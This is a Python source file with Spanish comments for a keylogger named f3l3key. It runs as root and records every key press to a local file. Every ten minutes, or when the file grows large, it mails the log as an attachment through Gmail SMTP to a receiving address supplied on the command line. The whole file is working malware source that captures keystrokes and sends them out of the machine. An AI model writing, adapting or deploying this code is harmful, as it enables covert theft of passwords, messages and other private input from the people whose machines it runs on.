import keyboard, os, time, datetime
import sys
import smtplib
import ssl
import re
from email.message import EmailMessage

# imprimimos un mensaje
def imprimir_mensaje(ayuda):
    for c in ayuda:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.02)
    print("\n")

# con estas condiciones nos aseguramos de que el paso de parámetros se realice de forma correcta
if os.getuid() != 0:
    ayuda = """
        Debes ejecutar este script como root o con permisos de administrador.
    """
    imprimir_mensaje(ayuda)
    sys.exit(0)
elif len(sys.argv) == 2 and sys.argv[1] == "-h":
    ayuda = """
        python3 f3l3key.py 'correo del emisor' 'pass del emisor' 'correo del receptor'\n
        Ej: python3 f3l3key.py emisor@gmail.com 123456 receptor@gmail.com
    """
    imprimir_mensaje(ayuda)
    sys.exit(0)
elif len(sys.argv) != 4:
    ayuda = """
        Debes proporcionar exactamente tres argumentos: email_sender, email_password, email_receiver.\n
        Ejemplo de uso: python3 f3l3key.py emisor@gmail.com password123 receptor@gmail.com
    """
    imprimir_mensaje(ayuda)
    sys.exit(1)
elif not (re.match(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", sys.argv[1]) and re.match(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", sys.argv[3])):
    ayuda = """
        La dirección de correo electrónico no es válida. Verifica la sintaxis de ambos correos.
        """
    imprimir_mensaje(ayuda)
    sys.exit(1)

# Se guardan los parametros pasados por terminal (el correo emisor, receptor y la contraseña)
email_sender = sys.argv[1] # Email del emisor
email_password = sys.argv[2] # Password del emisor
email_receiver = sys.argv[3] # Email del receptor

# Guardamos el nombre del archivo donde se almacenarán las pulsaciones de las teclas
filename = 'file.txt'

inicio = time.time() # se inicia el temporizador para que se pueda calcular los 10minutos para el envío del correo

# Se guardan los parámetros necesarios para el envío del correo
def detalles_envio():
    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['Subject'] = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    em.set_content(datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S"))
    em.add_attachment(open(filename, 'r').read(), filename='file.txt')
    # Add SSL (layer of security)
    context = ssl.create_default_context()
    return em, context

# Se envía el correo a través del método sendmail
def sendMail():
    sw = True
    while sw:
        detalles = detalles_envio()
        try:
            # Log in and send the email
            with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=detalles[1]) as smtp:
                smtp.login(email_sender, email_password)
                smtp.sendmail(email_sender, email_receiver, detalles[0].as_string())
            sw = False
        except:
            pass

# Se calcula el tiempo de tal manera que si han pasado 10min se envíe el correo
def file_modif_and_time():
    global inicio
    file_stats = os.stat("file.txt")
    if file_stats.st_size > 0 and int(round(time.time()-inicio,1)) >= 600:
        inicio = time.time()
        sendMail()

# Se calcula el size del archivo para que no supere los 20mb
def size_f():
    global inicio
    file_stats = os.stat("file.txt")
    if 10485760 <= file_stats.st_size <= 18922944:
        sendMail()
        with open("file.txt", "w") as f:
            f.write('')
            f.close()
        inicio = time.time()

# Se capturan las teclas
def reg_keys():
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            file_r = open("file.txt", "a")
            key = event.name
            file_r.write(f'Tecla: "{key}"\n')
            file_r.close()
            size_f()
            file_modif_and_time()

# Se comprueba si el archivo está creado o no en el sistema
def create_file():
    if not os.path.exists('file.txt'):
        file=open("file.txt", "w")
        file.close()

# Se llama a las demás funciones
def main():
    create_file()
    reg_keys()

if __name__ == "__main__":
    main()
